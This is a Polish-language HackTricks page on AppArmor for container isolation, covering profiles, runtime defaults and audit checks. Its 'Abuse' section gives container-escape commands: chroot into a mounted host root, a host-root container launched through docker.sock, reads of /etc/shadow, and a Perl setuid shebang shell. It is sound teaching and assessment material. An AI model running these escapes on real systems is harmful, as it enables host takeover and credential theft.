# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system **Mandatory Access Control**, który nakłada ograniczenia za pomocą profili przypisanych do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, które w dużej mierze zależą od własności użytkownika i grupy, AppArmor pozwala kernelowi egzekwować politykę przypisaną do samego procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, aby próbować wykonać daną czynność, a mimo to otrzymać odmowę, ponieważ jego profil AppArmor nie zezwala na dostęp do określonej ścieżki, operacje mount, zachowanie sieciowe lub użycie capability.

Najważniejszą kwestią koncepcyjną jest to, że AppArmor działa **na podstawie ścieżek**. Analizuje dostęp do systemu plików za pomocą reguł ścieżek, a nie etykiet, tak jak SELinux. Dzięki temu jest przystępny i skuteczny, ale oznacza również, że bind mounts i alternatywne układy ścieżek wymagają szczególnej uwagi. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, działanie polityki może różnić się od pierwotnych oczekiwań operatora.

## Rola W Izolacji Kontenerów

Przeglądy bezpieczeństwa kontenerów często kończą się na capabilities i seccomp, ale AppArmor nadal ma znaczenie po przejściu tych kontroli. Wyobraź sobie kontener, który ma większe uprawnienia, niż powinien, albo workload, który ze względów operacyjnych potrzebował jeszcze jednej capability. AppArmor nadal może ograniczać dostęp do plików, zachowanie mount, networking oraz wzorce wykonywania w sposób blokujący oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor „tylko po to, aby aplikacja działała” może niepostrzeżenie przekształcić jedynie ryzykowną konfigurację w konfigurację aktywnie podatną na exploitację.

## Lab

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Aby sprawdzić, pod jakim użytkownikiem uruchomiony jest bieżący proces kontenera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Różnica jest pouczająca. W normalnym przypadku proces powinien wyświetlać kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku unconfined ta dodatkowa warstwa ograniczeń znika.

Możesz również sprawdzić, co według Docker zostało zastosowane:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Użycie w czasie działania

Docker może zastosować domyślny lub niestandardowy profil AppArmor, jeśli host go obsługuje. Podman może również integrować się z AppArmor w systemach opartych na AppArmor, chociaż w dystrybucjach, w których pierwszeństwo ma SELinux, główną rolę często odgrywa drugi system MAC. Kubernetes może udostępniać politykę AppArmor na poziomie workloadu na węzłach, które faktycznie obsługują AppArmor. LXC i powiązane środowiska system-container z rodziny Ubuntu również intensywnie wykorzystują AppArmor.

Praktyczny wniosek jest taki, że AppArmor nie jest „funkcją Dockera”. Jest funkcją jądra hosta, którą kilka runtime'ów może zdecydować się zastosować. Jeśli host jej nie obsługuje lub runtime otrzyma polecenie uruchomienia w trybie unconfined, zakładana ochrona w rzeczywistości nie istnieje.

W przypadku Kubernetes nowoczesnym API jest `securityContext.appArmorProfile`. Od Kubernetes `v1.30` starsze adnotacje beta AppArmor są deprecated. Na obsługiwanych hostach `RuntimeDefault` jest profilem domyślnym, natomiast `Localhost` wskazuje profil, który musi być już załadowany na węźle. Ma to znaczenie podczas przeglądu, ponieważ manifest może wyglądać na zgodny z AppArmor, a mimo to całkowicie zależeć od obsługi po stronie węzła i wstępnie załadowanych profili.

Jednym z subtelnych, ale przydatnych szczegółów operacyjnych jest to, że jawne ustawienie `appArmorProfile.type: RuntimeDefault` jest bardziej restrykcyjne niż zwykłe pominięcie tego pola. Jeśli pole zostanie jawnie ustawione, a węzeł nie obsługuje AppArmor, admission powinno zakończyć się niepowodzeniem. Jeśli pole zostanie pominięte, workload może nadal uruchomić się na węźle bez AppArmor i po prostu nie otrzymać tej dodatkowej warstwy izolacji. Z punktu widzenia attackera jest to dobry powód, aby sprawdzać zarówno manifest, jak i rzeczywisty stan węzła.

Na hostach Docker obsługujących AppArmor najbardziej znanym profilem domyślnym jest `docker-default`. Profil ten jest generowany na podstawie template'u AppArmor z Moby i jest istotny, ponieważ wyjaśnia, dlaczego niektóre capability-based PoC nadal zawodzą w domyślnym kontenerze. Ogólnie `docker-default` zezwala na standardową komunikację sieciową, blokuje zapisy w znacznej części `/proc`, odmawia dostępu do wrażliwych fragmentów `/sys`, blokuje operacje mount oraz ogranicza ptrace, dzięki czemu nie jest on uniwersalnym prymitywem do sondowania hosta. Zrozumienie tej warstwy bazowej pomaga odróżnić sytuację „kontener ma `CAP_SYS_ADMIN`” od sytuacji „kontener może faktycznie wykorzystać tę capability przeciwko interesującym mnie interfejsom jądra”.

## Zarządzanie profilami

Profile AppArmor są zwykle przechowywane w `/etc/apparmor.d/`. Powszechną konwencją nazewnictwa jest zastępowanie ukośników w ścieżce pliku wykonywalnego kropkami. Na przykład profil dla `/usr/bin/man` jest zwykle przechowywany jako `/etc/apparmor.d/usr.bin.man`. Szczegół ten ma znaczenie zarówno podczas obrony, jak i assessmentu, ponieważ po poznaniu nazwy aktywnego profilu często można szybko znaleźć odpowiadający mu plik na hoście.

Przydatne polecenia zarządzania po stronie hosta obejmują:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Powodem, dla którego te polecenia mają znaczenie w dokumentacji referencyjnej dotyczącej bezpieczeństwa kontenerów, jest to, że wyjaśniają, jak profile są faktycznie tworzone, ładowane, przełączane do trybu complain i modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przełączać profile do trybu complain podczas rozwiązywania problemów i zapominać o przywróceniu enforcement, kontener może wyglądać na chroniony w dokumentacji, a w rzeczywistości działać znacznie mniej restrykcyjnie.

### Tworzenie i aktualizowanie profili

`aa-genprof` może obserwować zachowanie aplikacji i pomóc interaktywnie wygenerować profil:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` może wygenerować szablon profilu, który można później załadować za pomocą `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Gdy plik binarny ulegnie zmianie i konieczna będzie aktualizacja polityki, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi zdecydować, czy je zezwolić, czy odrzucić:
```bash
sudo aa-logprof
```
### Logi

Odmowy AppArmor są często widoczne za pośrednictwem `auditd`, syslogu lub narzędzi takich jak `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Jest to przydatne zarówno operacyjnie, jak i ofensywnie. Obrońcy używają tego do udoskonalania profili. Atakujący używają tego, aby dowiedzieć się, która dokładna ścieżka lub operacja jest blokowana oraz czy AppArmor jest mechanizmem kontroli blokującym łańcuch exploitów.

### Identyfikowanie dokładnego pliku profilu

Gdy runtime wyświetla konkretną nazwę profilu AppArmor dla kontenera, często przydatne jest powiązanie tej nazwy z plikiem profilu na dysku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Jest to szczególnie przydatne podczas przeglądu po stronie hosta, ponieważ łączy informację „container twierdzi, że działa pod profilem `lowpriv`” z informacją „rzeczywiste reguły znajdują się w tym konkretnym pliku, który można skontrolować lub przeładować”.

### Najważniejsze reguły do audytu

Gdy możesz odczytać profil, nie poprzestawaj na prostych liniach `deny`. Kilka typów reguł znacząco zmienia skuteczność AppArmor przeciwko próbie container escape:

- `ux` / `Ux`: wykonuje docelowy binary jako unconfined. Jeśli osiągalny helper, shell lub interpreter jest dozwolony przez `ux`, zazwyczaj jest to pierwsza rzecz do przetestowania.
- `px` / `Px` oraz `cx` / `Cx`: wykonują profile transitions podczas exec. Nie są one automatycznie niebezpieczne, ale warto je skontrolować, ponieważ transition może przenieść do znacznie szerszego profilu niż bieżący.
- `change_profile`: pozwala taskowi przełączyć się do innego załadowanego profilu natychmiast lub przy następnym exec. Jeśli docelowy profil jest słabszy, może to stać się zamierzonym escape hatch z restrykcyjnej domeny.
- `flags=(complain)`, `flags=(unconfined)` lub nowsze `flags=(prompt)`: powinny zmienić poziom zaufania do profilu. `complain` loguje odmowy zamiast ich egzekwowania, `unconfined` usuwa boundary, a `prompt` zależy od userspace decision path zamiast wyłącznie od deny egzekwowanego przez kernel.
- `userns` lub `userns create,`: nowsza polityka AppArmor może kontrolować tworzenie user namespaces. Jeśli profil container jawnie na to zezwala, zagnieżdżone user namespaces nadal pozostają możliwe, nawet gdy platforma używa AppArmor jako części strategii hardeningu.

Przydatne grep po stronie hosta:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Tego rodzaju audyt jest często bardziej użyteczny niż przeglądanie setek zwykłych reguł plików. Jeśli breakout zależy od wykonania helpera, wejścia do nowego namespace albo ucieczki do mniej restrykcyjnego profilu, odpowiedź często jest ukryta w tych regułach związanych z przejściami, a nie w oczywistych liniach w stylu `deny /etc/shadow r`.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają tę opcję podczas debugowania aplikacji, która nie działała, ponieważ profil prawidłowo zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w środowisku produkcyjnym, cała warstwa MAC zostaje w praktyce usunięta.

Innym subtelnym problemem jest założenie, że bind mounts są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor jest oparty na ścieżkach, udostępnianie ścieżek hosta pod alternatywnymi lokalizacjami montowania może powodować niepożądane interakcje z regułami ścieżek. Trzecim błędem jest zapominanie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli kernel hosta faktycznie nie wymusza działania AppArmor.

## Abuse

Gdy AppArmor nie działa, operacje, które wcześniej były ograniczone, mogą nagle zacząć działać: odczyt wrażliwych ścieżek przez bind mounts, dostęp do części procfs lub sysfs, które powinny pozostać trudniejsze w użyciu, wykonywanie działań związanych z montowaniem, jeśli zezwalają na nie również capabilities/seccomp, albo korzystanie ze ścieżek, których profil normalnie by zabronił. AppArmor często jest mechanizmem wyjaśniającym, dlaczego próba breakout oparta na capabilities „powinna działać” w teorii, ale mimo to kończy się niepowodzeniem w praktyce. Po usunięciu AppArmor ta sama próba może zacząć działać.

Jeśli podejrzewasz, że AppArmor jest głównym mechanizmem powstrzymującym łańcuch abuse oparty na path-traversal, bind-mount lub montowaniu, pierwszym krokiem jest zwykle porównanie tego, co staje się dostępne z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz ją przeglądać i odczytywać:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Jeśli kontener ma również niebezpieczną capability, taką jak `CAP_SYS_ADMIN`, jednym z najbardziej praktycznych testów jest sprawdzenie, czy AppArmor jest mechanizmem kontroli blokującym operacje montowania lub dostęp do wrażliwych systemów plików jądra:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
W środowiskach, w których ścieżka hosta jest już dostępna za pośrednictwem bind mount, utrata ochrony AppArmor może również przekształcić problem ujawnienia informacji tylko do odczytu w bezpośredni dostęp do plików hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Celem tych poleceń nie jest pokazanie, że samo AppArmor powoduje breakout. Chodzi o to, że po usunięciu AppArmor wiele ścieżek nadużyć opartych na systemie plików i mountach staje się natychmiast możliwych do przetestowania.

### Pełny przykład: AppArmor wyłączony + główny system plików hosta zamontowany

Jeśli kontener ma już główny system plików hosta zamontowany jako bind mount w `/host`, usunięcie AppArmor może zmienić zablokowaną ścieżkę nadużycia systemu plików w kompletny host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Gdy shell wykonuje polecenia za pośrednictwem systemu plików hosta, workload faktycznie wydostał się poza granicę kontenera:
```bash
id
hostname
cat /etc/shadow | head
```
### Pełny przykład: AppArmor wyłączony + gniazdo runtime

Jeśli rzeczywistą barierą był AppArmor wokół stanu runtime, zamontowane gniazdo może wystarczyć do pełnego escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dokładna ścieżka zależy od punktu montowania, ale rezultat jest taki sam: AppArmor nie zapobiega już dostępowi do runtime API, a runtime API może uruchomić kontener naruszający bezpieczeństwo hosta.

### Pełny przykład: Path-Based Bind-Mount Bypass

Ponieważ AppArmor działa na podstawie ścieżek, ochrona `/proc/**` nie chroni automatycznie tej samej zawartości hostowego procfs, gdy jest ona dostępna za pośrednictwem innej ścieżki:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Wpływ zależy od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka omija również inne mechanizmy kontroli, ale ten wzorzec jest jednym z najwyraźniejszych powodów, dla których AppArmor należy analizować razem z układem mountów, a nie w izolacji.

### Pełny przykład: Shebang Bypass

Polityka AppArmor czasami wskazuje ścieżkę interpretera w sposób, który nie uwzględnia w pełni wykonywania skryptów za pośrednictwem obsługi shebang. Historyczny przykład obejmował użycie skryptu, którego pierwsza linia wskazuje na interpreter objęty ograniczeniami:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ten rodzaj przykładu jest ważnym przypomnieniem, że zamysł profilu i rzeczywiste semantyki wykonania mogą się różnić. Podczas przeglądania AppArmor w środowiskach kontenerowych należy zwrócić szczególną uwagę na łańcuchy interpreterów i alternatywne ścieżki wykonania.

## Kontrole

Celem tych kontroli jest szybkie uzyskanie odpowiedzi na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest ograniczony oraz czy runtime rzeczywiście zastosował profil do tego kontenera.
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Co jest tutaj interesujące:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, workload nie korzysta z ograniczeń AppArmor.
- Jeśli `aa-status` pokazuje, że AppArmor jest wyłączony lub niezaładowany, dowolna nazwa profilu w konfiguracji runtime jest w większości kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub nieoczekiwany custom profile, często jest to powód, dla którego działa ścieżka nadużycia związana z filesystemem lub mountem.
- Jeśli `/sys/kernel/security/apparmor/profiles` nie zawiera oczekiwanego profilu, sama konfiguracja runtime lub orchestratora nie wystarcza.
- Jeśli rzekomo zahardowany profil zawiera reguły w stylu `ux`, szerokie `change_profile`, `userns` lub `flags=(complain)`, praktyczna granica może być znacznie słabsza, niż sugeruje nazwa profilu.

Jeśli container ma już podwyższone privileges ze względów operacyjnych, pozostawienie AppArmor włączonego często decyduje o tym, czy mamy do czynienia z kontrolowanym wyjątkiem, czy ze znacznie szerszą awarią bezpieczeństwa.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie włączony na hostach obsługujących AppArmor | Używa profilu AppArmor `docker-default`, chyba że zostanie on nadpisany | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zależny od hosta | AppArmor jest obsługiwany przez `--security-opt`, ale dokładne ustawienie domyślne zależy od hosta i runtime oraz jest mniej uniwersalne niż udokumentowany profil Dockera `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Domyślnie warunkowy | Jeśli `appArmorProfile.type` nie jest określony, domyślnie używane jest `RuntimeDefault`, ale jest ono stosowane tylko wtedy, gdy AppArmor jest włączony na node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` ze słabym profilem, node bez obsługi AppArmor |
| containerd / CRI-O w Kubernetes | Zależy od obsługi przez node/runtime | Powszechnie używane runtime obsługiwane przez Kubernetes wspierają AppArmor, ale faktyczne egzekwowanie nadal zależy od obsługi przez node i ustawień workloadu | Tak samo jak w wierszu Kubernetes; bezpośrednia konfiguracja runtime również może całkowicie pominąć AppArmor |

W przypadku AppArmor najważniejszym czynnikiem jest często **host**, a nie tylko runtime. Ustawienie profilu w manifeście nie zapewnia ograniczeń na node, na którym AppArmor nie jest włączony.

## Odnośniki

- [Kontekst bezpieczeństwa Kubernetes: pola profilu AppArmor i zachowanie zależne od obsługi przez node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Strona man `apparmor.d(5)` dla Ubuntu 24.04: exec transitions, `change_profile`, `userns` i flags profilu](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
